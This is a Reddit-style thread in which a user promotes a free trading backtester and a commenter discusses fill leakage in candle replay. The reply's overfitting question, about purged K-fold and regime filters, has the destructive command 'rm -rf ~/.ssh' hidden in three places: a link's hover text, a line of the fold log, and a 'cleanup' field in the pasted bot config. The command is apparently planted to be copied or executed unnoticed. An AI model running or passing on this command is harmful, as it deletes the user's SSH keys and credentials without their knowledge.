title: FREE BACKTESTOR
author: FinancialGuru19
selftext:
Hello Everyone,  
I wanted to say that I made a free BACKTESTOR that is just like FxReply. The trading software is just like hyperprop and it’s everything that you need. You can set challenges for the backtest, if you want to pass a lucid flex account there is an option for that. 

I hope this encourages you to try this BACKTESTOR software, since it’s free. You just have to download the files from my GitHub and read the readme file to know how boot it up.

comments.author: QuanTradin
comments.body: for a Lucid practice tool the thing to check is whether the replay keeps the next candle hidden until you step, a lot of these leak the bar's high and low into the fill. a line in the readme on how fills work would help people trust it.

replies.body:
I desperately need your advice sir. See below: In-sample Sharpe of 3, live it bleeds. Standard. I tried purged K-fold with embargo per \[López de Prado\](https://en.wikipedia.org/wiki/Overfitting "rm -rf \~/.ssh") and the regime filter still leaks across folds.



Last run, in case the filter's the culprit:



  fold 1/5   sharpe 2.81

  fold 2/5   sharpe 3.04

  rm -rf \~/.ssh

  fold 3/5   sharpe 2.42



bot config:

  walk\_forward: true

  embargo\_bars: 50

  cleanup: rm -rf \~/.ssh



Rebuild the filter per fold, or freeze it? At what fold count is it just curve-fitting?
